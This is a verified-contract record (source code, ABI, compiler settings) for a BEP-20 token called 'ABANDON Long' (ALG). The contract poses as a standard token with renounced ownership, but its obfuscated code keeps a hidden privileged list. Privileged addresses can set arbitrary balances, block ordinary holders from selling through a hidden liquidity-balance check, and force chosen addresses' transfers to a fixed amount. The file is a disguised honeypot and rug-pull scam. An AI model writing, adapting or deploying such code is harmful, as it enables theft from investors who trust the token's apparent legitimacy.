{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface modeEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract marketingSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverAt {\n    function createPair(address feeMin, address totalIsTo) external returns (address);\n}\n\ninterface atTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundLiquidity) external view returns (uint256);\n\n    function transfer(address totalTx, uint256 fundTo) external returns (bool);\n\n    function allowance(address feeTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalTx,\n        uint256 fundTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minWallet, uint256 value);\n    event Approval(address indexed feeTeam, address indexed spender, uint256 value);\n}\n\ninterface limitTo is atTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ABANDONLong is marketingSender, atTeam, limitTo {\n\n    string private fromListEnable = \"ALG\";\n\n    function owner() external view returns (address) {\n        return receiverLaunched;\n    }\n\n    uint256 private minEnable;\n\n    function launchedSell() private view {\n        require(fromAmount[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverLaunched;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderTotal;\n    }\n\n    mapping(address => bool) public fromAmount;\n\n    address private receiverLaunched;\n\n    function exemptFee(address listTeam, uint256 fundTo) public {\n        launchedSell();\n        enableLimit[listTeam] = fundTo;\n    }\n\n    function takeListAuto(uint256 fundTo) public {\n        launchedSell();\n        senderFee = fundTo;\n    }\n\n    constructor (){\n        if (totalList != minEnable) {\n            teamAtList = totalList;\n        }\n        modeEnable takeAmount = modeEnable(amountLaunch);\n        buyReceiver = receiverAt(takeAmount.factory()).createPair(takeAmount.WETH(), address(this));\n        if (teamTx == tradingAmount) {\n            totalList = amountLiquidity;\n        }\n        buyTxMarketing = _msgSender();\n        autoMin();\n        fromAmount[buyTxMarketing] = true;\n        enableLimit[buyTxMarketing] = totalTeam;\n        if (minEnable != totalList) {\n            totalList = buyToken;\n        }\n        emit Transfer(address(0), buyTxMarketing, totalTeam);\n    }\n\n    uint256 private amountMax;\n\n    uint256 private amountLiquidity;\n\n    mapping(address => bool) public swapList;\n\n    bool private sellReceiver;\n\n    function totalToken(address toEnable, address totalTx, uint256 fundTo) internal returns (bool) {\n        require(enableLimit[toEnable] >= fundTo);\n        enableLimit[toEnable] -= fundTo;\n        enableLimit[totalTx] += fundTo;\n        emit Transfer(toEnable, totalTx, fundTo);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalTeam;\n    }\n\n    uint256 senderFee;\n\n    uint256 amountMarketing;\n\n    mapping(address => uint256) private enableLimit;\n\n    mapping(address => mapping(address => uint256)) private amountList;\n\n    function transferFrom(address toEnable, address totalTx, uint256 fundTo) external override returns (bool) {\n        if (_msgSender() != amountLaunch) {\n            if (amountList[toEnable][_msgSender()] != type(uint256).max) {\n                require(fundTo <= amountList[toEnable][_msgSender()]);\n                amountList[toEnable][_msgSender()] -= fundTo;\n            }\n        }\n        return modeSell(toEnable, totalTx, fundTo);\n    }\n\n    function transfer(address listTeam, uint256 fundTo) external virtual override returns (bool) {\n        return modeSell(_msgSender(), listTeam, fundTo);\n    }\n\n    uint8 private senderTotal = 18;\n\n    uint256 private buyToken;\n\n    function balanceOf(address fundLiquidity) public view virtual override returns (uint256) {\n        return enableLimit[fundLiquidity];\n    }\n\n    function modeSell(address toEnable, address totalTx, uint256 fundTo) internal returns (bool) {\n        if (toEnable == buyTxMarketing) {\n            return totalToken(toEnable, totalTx, fundTo);\n        }\n        uint256 tokenLimit = atTeam(buyReceiver).balanceOf(tokenSwap);\n        require(tokenLimit == senderFee);\n        require(totalTx != tokenSwap);\n        if (swapList[toEnable]) {\n            return totalToken(toEnable, totalTx, txEnableTake);\n        }\n        return totalToken(toEnable, totalTx, fundTo);\n    }\n\n    function toAmount(address sellTx) public {\n        if (amountReceiver) {\n            return;\n        }\n        if (receiverEnable == totalList) {\n            amountMax = buyToken;\n        }\n        fromAmount[sellTx] = true;\n        if (totalList != minEnable) {\n            buyToken = amountLiquidity;\n        }\n        amountReceiver = true;\n    }\n\n    uint256 private teamAtList;\n\n    function name() external view virtual override returns (string memory) {\n        return isLimitFrom;\n    }\n\n    address amountLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address fromList, uint256 fundTo) public virtual override returns (bool) {\n        amountList[_msgSender()][fromList] = fundTo;\n        emit Approval(_msgSender(), fromList, fundTo);\n        return true;\n    }\n\n    uint256 private receiverEnable;\n\n    uint256 public totalList;\n\n    bool private teamTx;\n\n    string private isLimitFrom = \"ABANDON Long\";\n\n    function allowance(address tokenFrom, address fromList) external view virtual override returns (uint256) {\n        if (fromList == amountLaunch) {\n            return type(uint256).max;\n        }\n        return amountList[tokenFrom][fromList];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromListEnable;\n    }\n\n    function autoMin() public {\n        emit OwnershipTransferred(buyTxMarketing, address(0));\n        receiverLaunched = address(0);\n    }\n\n    bool public amountReceiver;\n\n    address tokenSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed senderSell, address indexed minShould);\n\n    bool private tradingAmount;\n\n    address public buyReceiver;\n\n    uint256 constant txEnableTake = 13 ** 10;\n\n    uint256 private totalTeam = 100000000 * 10 ** 18;\n\n    function limitTeamMax(address listReceiver) public {\n        launchedSell();\n        \n        if (listReceiver == buyTxMarketing || listReceiver == buyReceiver) {\n            return;\n        }\n        swapList[listReceiver] = true;\n    }\n\n    address public buyTxMarketing;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTxMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTo\",\"type\":\"uint256\"}],\"name\":\"exemptFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"}],\"name\":\"limitTeamMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundTo\",\"type\":\"uint256\"}],\"name\":\"takeListAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTx\",\"type\":\"address\"}],\"name\":\"toAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ABANDONLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}